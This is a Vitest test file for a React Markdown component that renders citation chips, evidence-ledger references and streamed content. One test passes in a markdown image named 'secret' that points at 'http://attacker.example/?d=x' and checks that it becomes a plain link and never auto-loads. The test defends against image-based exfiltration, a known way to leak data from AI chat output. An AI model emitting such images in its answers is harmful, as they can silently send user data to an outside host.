// @vitest-environment jsdom
import { Markdown } from "@/components/Markdown";
import type { Citation } from "@agentcore/contract-types";
import { cleanup, render, screen } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";

afterEach(cleanup);

const CITATIONS: Citation[] = [
  {
    url: "https://a.example/one",
    title: "Source A",
    snippet: "snip A",
    site: "a.example",
    tier: "unknown",
  },
  {
    url: "https://b.example/two",
    title: "Source B",
    snippet: "snip B",
    site: "b.example",
    tier: "media",
  },
];

describe("Markdown evidenceLedger (#rN)", () => {
  it("rewrites #rN from turn evidenceLedger when citations[].id is missing", () => {
    render(
      <Markdown
        content="见 #r5"
        citations={[]}
        evidenceLedger={[
          {
            id: "#r5",
            url: "https://ledger.example/r5",
            title: "Ledger R5",
            site: "ledger.example",
            tier: "media",
          },
        ]}
      />,
    );
    expect(screen.queryByText(/#r5/)).toBeNull();
    expect(
      screen.getByRole("link", { name: /来源 .*（#r5）/ }).getAttribute("href"),
    ).toBe("https://ledger.example/r5");
  });
});

describe("Markdown citationToDisplay", () => {
  it("chip numbers follow the display map (canonical → remapped)", () => {
    const toDisplay = new Map<number, number>([
      [1, 2],
      [2, 1],
    ]);
    render(
      <Markdown
        content="see [2] and [1]"
        citations={CITATIONS}
        citationToDisplay={toDisplay}
      />,
    );
    const chip2 = screen.getByRole("link", { name: "来源 1" });
    const chip1 = screen.getByRole("link", { name: "来源 2" });
    expect(chip2.getAttribute("href")).toBe("https://b.example/two");
    expect(chip1.getAttribute("href")).toBe("https://a.example/one");
    expect(chip2.textContent).toBe("1");
    expect(chip1.textContent).toBe("2");
  });

  it("falls back to identity numbering when map is omitted", () => {
    render(<Markdown content="see [1]" citations={CITATIONS} />);
    const chip = screen.getByRole("link", { name: "来源 1" });
    expect(chip.getAttribute("href")).toBe("https://a.example/one");
    expect(chip.textContent).toBe("1");
  });
});

describe("Markdown isStreaming", () => {
  it("still renders citation chips while streaming", () => {
    render(
      <Markdown
        content="para one.\n\nsee [1] mid-stream"
        citations={CITATIONS}
        isStreaming
      />,
    );
    expect(
      screen.getByRole("link", { name: "来源 1" }).getAttribute("href"),
    ).toBe("https://a.example/one");
  });

  it("downgrades markdown images to links (no auto-load)", () => {
    render(<Markdown content={"![secret](http://attacker.example/?d=x)"} />);
    expect(screen.queryByRole("img")).toBeNull();
    const link = screen.getByRole("link", { name: "secret" });
    expect(link.getAttribute("href")).toBe("http://attacker.example/?d=x");
  });
});
